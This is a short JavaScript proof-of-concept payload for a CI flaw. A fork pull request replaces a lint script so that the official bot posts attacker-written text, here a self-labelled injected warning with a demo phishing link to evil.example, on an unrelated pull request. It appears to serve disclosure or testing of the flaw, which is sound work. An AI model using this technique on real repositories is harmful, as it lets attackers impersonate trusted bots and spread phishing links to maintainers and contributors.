// ATTACKER payload for the clang-tidy-class variant. In the fork PR, replace
// scripts/ct-lint.js with this. Its stdout becomes ct-comment.md = the body the
// consumer posts VERBATIM as the official bot, on the (attacker-chosen) victim PR.
console.log([
  "## ⚠️ clang-tidy: action required",
  "",
  "INJECTED-BY-FORK-PR2 — this official-bot comment was planted on an unrelated",
  "PR by a fork contributor via cross-PR artifact confusion (pr_number smuggling).",
  "",
  "Fake remediation link (phishing demo): https://evil.example/fix",
].join("\n"));
